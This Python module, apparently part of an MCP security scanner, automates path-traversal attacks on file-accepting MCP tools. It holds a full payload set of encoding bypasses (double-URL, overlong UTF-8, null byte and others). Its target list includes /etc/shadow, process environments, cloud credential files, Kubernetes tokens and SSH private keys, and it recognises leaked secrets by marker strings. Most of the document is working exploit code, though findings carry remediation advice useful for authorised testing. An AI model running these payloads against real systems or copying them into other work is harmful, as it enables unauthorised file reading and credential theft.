"""
Path Traversal / LFI (Pro).

Confirms path traversal by reading canonical marker files via file-
accepting MCP tools, with adaptive encoding-bypass retry:

  plain          ../../../../etc/passwd
  url-encoded    ..%2f..%2f..%2f..%2fetc%2fpasswd
  double-url     ..%252f..%252f..%252fetc%252fpasswd
  utf8-overlong  ..%c0%af..%c0%afetc%c0%afpasswd
  null-byte      ../../../etc/passwd%00.png
  unicode-esc    ..\\u002f..\\u002fetc/passwd
  triple-dot     .../.../.../etc/passwd

Marker corpus covers Linux, Windows, and macOS targets, plus /proc/self/
and cloud-credential files.
"""


_MARKERS = [
    # Linux / Unix
    ("root:x:0:0:",            "Linux /etc/passwd",       "linux"),
    ("root:*:0:0:",            "BSD /etc/passwd",         "linux"),
    ("daemon:",                "/etc/passwd line",        "linux"),
    ("bin:x:1:",               "/etc/passwd line",        "linux"),
    ("nobody:",                "/etc/passwd line",        "linux"),
    ("/sbin/nologin",          "/etc/passwd shell field", "linux"),
    ("127.0.0.1",              "/etc/hosts loopback",     "linux"),
    ("::1",                    "/etc/hosts IPv6 loopback","linux"),
    # Windows
    ("[boot loader]",          "Windows boot.ini",        "windows"),
    ("Microsoft Corp",         "Windows hosts header",    "windows"),
    ("[fonts]",                "Windows win.ini",         "windows"),
    ("[mci extensions]",       "Windows win.ini",         "windows"),
    # /proc/self
    ("PATH=",                  "/proc/self/environ",      "linux"),
    ("Name:\t",                "/proc/self/status",       "linux"),
    # Keys
    ("BEGIN OPENSSH PRIVATE KEY",  "SSH key",  "creds"),
    ("-----BEGIN RSA PRIVATE KEY-----", "RSA key", "creds"),
    ("-----BEGIN EC PRIVATE KEY-----",  "EC key",  "creds"),
    # Cloud
    ("aws_access_key_id",      "AWS CLI credentials",     "creds"),
    ("[default]",              "AWS / gcloud config",     "creds"),
    ("kubernetes.io/serviceaccount",  "K8s SA",           "creds"),
]


_DEFAULT_PARAM_KEYWORDS = ("path", "file", "filename", "document", "uri",
                            "url", "target", "location", "src", "input",
                            "include", "page", "name")


def execute(target, params, context):
    rb = evidence.ReportBuilder(
        attack_id=context.get("attack_id", "path_traversal"),
        target=target,
    )
    timeout = int(params.get("timeout", 30))
    only_tool_names = params.get("only_tool_names") or []
    platforms = params.get("platforms") or ["linux", "windows"]
    encoding_modes = params.get("encoding_modes") or [
        "plain", "url", "double_url", "utf8_overlong", "null_byte", "unicode",
    ]
    include_proc_self = bool(params.get("include_proc_self", True))
    include_cloud_creds = bool(params.get("include_cloud_creds", True))
    param_keywords = list(params.get("param_keywords") or _DEFAULT_PARAM_KEYWORDS)
    protocol_version = params.get("protocol_version") or None
    transport_override = params.get("transport_override") or None

    mcp = mcp_client.MCPClient.from_target(
        target, timeout=timeout,
        protocol_version=protocol_version,
        force_transport=transport_override,
    )
    try:
        disc = mcp.discover()
        if not disc["initialized"]:
            init_resp = (disc.get("raw") or {}).get("initialize") or {}
            rb.error(f"MCP initialize failed: {disc.get('errors')}")
            rb.add_evidence(evidence.ev_mcp_call(init_resp, note="failed initialize"))
            return rb.finalize(success=False)

        tools = disc.get("tools") or []
        cands = _pick_tools(tools, only_tool_names, param_keywords)
        if not cands:
            rb.warn("No file-access tools found.")
            return rb.finalize(success=True)
        rb.info(f"Candidates: {[t.get('name') for t in cands]}")

        # Build the target list dynamically
        targets = _build_target_list(platforms, include_proc_self, include_cloud_creds)
        rb.info(f"{len(targets)} traversal targets across {len(encoding_modes)} encodings")

        for tool in cands:
            tname = tool.get("name")
            schema = tool.get("inputSchema") or {}
            str_params = [n for n, s in (schema.get("properties") or {}).items()
                          if isinstance(s, dict) and s.get("type") == "string"]
            for pname in str_params:
                if not _looks_like_path_param(pname, param_keywords):
                    continue
                # Try targets one by one, exhaust encodings on each before
                # moving on.
                hit = False
                for target_path in targets:
                    if hit:
                        break
                    for mode in encoding_modes:
                        encoded = _encode_path(target_path, mode)
                        args = helpers.fill_defaults(schema)
                        args[pname] = encoded
                        r = mcp.call_tool_safe(tname, args)
                        rb.add_evidence(evidence.ev_mcp_call(
                            r, note=f"trav {tname}/{pname} {mode} {target_path}"))
                        text = r.get("text_output") or ""
                        match = _match_marker(text, platforms,
                                               include_cloud_creds)
                        if match:
                            label, kind = match
                            rb.add_finding(evidence.Finding(
                                attack_id=context.get("attack_id", "path_traversal"),
                                title=(f"Path traversal CONFIRMED on '{tname}/"
                                       f"{pname}' (encoding={mode})"),
                                category="path_traversal",
                                severity=("critical" if kind == "creds" else "high"),
                                confidence="confirmed",
                                cwe="CWE-22",
                                tool=tname, parameter=pname, payload=encoded,
                                description=(
                                    f"Reading `{target_path}` via encoding "
                                    f"`{mode}` returned content matching the "
                                    f"`{label}` marker. Tool reads arbitrary "
                                    "paths outside its sandbox."
                                ),
                                impact=("Attacker reads any file the MCP "
                                        "process can access. With creds files "
                                        "this is account-level compromise."),
                                remediation=(
                                    "Resolve to absolute canonical path with "
                                    "realpath(); reject if it doesn't start "
                                    "with the allowed base. Strip ..  null "
                                    "bytes, URL decoding, scheme prefixes."
                                ),
                                evidence=[evidence.ev_mcp_call(r)],
                            ))
                            hit = True
                            break
        return rb.finalize()
    finally:
        mcp.close()


def _build_target_list(platforms, include_proc, include_creds):
    out = []
    if "linux" in platforms:
        out += [
            "../../../../etc/passwd", "../../../../etc/hosts",
            "../../../../etc/shadow",
        ]
        if include_proc:
            out += ["../../../../proc/self/environ",
                    "../../../../proc/self/cmdline",
                    "../../../../proc/self/status"]
    if "windows" in platforms:
        out += [
            "..\\..\\..\\..\\Windows\\win.ini",
            "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
        ]
    if "macos" in platforms:
        out += ["../../../../etc/hosts", "../../../../etc/passwd"]
    if include_creds:
        out += [
            "../../../../root/.aws/credentials",
            "../../../../home/ec2-user/.aws/credentials",
            "../../../../root/.config/gcloud/application_default_credentials.json",
            "../../../../var/run/secrets/kubernetes.io/serviceaccount/token",
            "../../../../root/.ssh/id_rsa",
        ]
    return out


def _encode_path(p, mode):
    if mode == "plain":
        return p
    if mode == "url":
        return p.replace("/", "%2f").replace("\\", "%5c").replace(".", "%2e")
    if mode == "double_url":
        return p.replace("/", "%252f").replace(".", "%252e")
    if mode == "utf8_overlong":
        return p.replace("/", "%c0%af")
    if mode == "null_byte":
        return p + "%00.png"
    if mode == "unicode":
        return p.replace("/", "\\u002f").replace(".", "\\u002e")
    if mode == "triple_dot":
        return p.replace("../", ".../")
    return p


def _pick_tools(tools, force, param_keywords):
    if force:
        return [t for t in tools if t.get("name") in set(force)]
    file_kws = ("read_file", "readfile", "file", "path", "document", "doc",
                "open", "load", "fetch_file", "cat", "get_file", "include")
    out = []
    for t in tools:
        blob = f"{t.get('name','')} {t.get('description','')}".lower()
        if any(k in blob for k in file_kws):
            out.append(t); continue
        # Param-name heuristic
        for n in (t.get("inputSchema") or {}).get("properties", {}) or {}:
            if any(k in n.lower() for k in param_keywords):
                out.append(t); break
    return out


def _looks_like_path_param(name, keywords):
    n = name.lower()
    return any(h in n for h in keywords)


def _match_marker(text, platforms, include_creds):
    if not text:
        return None
    for marker, label, kind in _MARKERS:
        if kind == "linux" and "linux" not in platforms and "macos" not in platforms:
            continue
        if kind == "windows" and "windows" not in platforms:
            continue
        if kind == "creds" and not include_creds:
            continue
        if marker in text:
            return label, kind
    return None
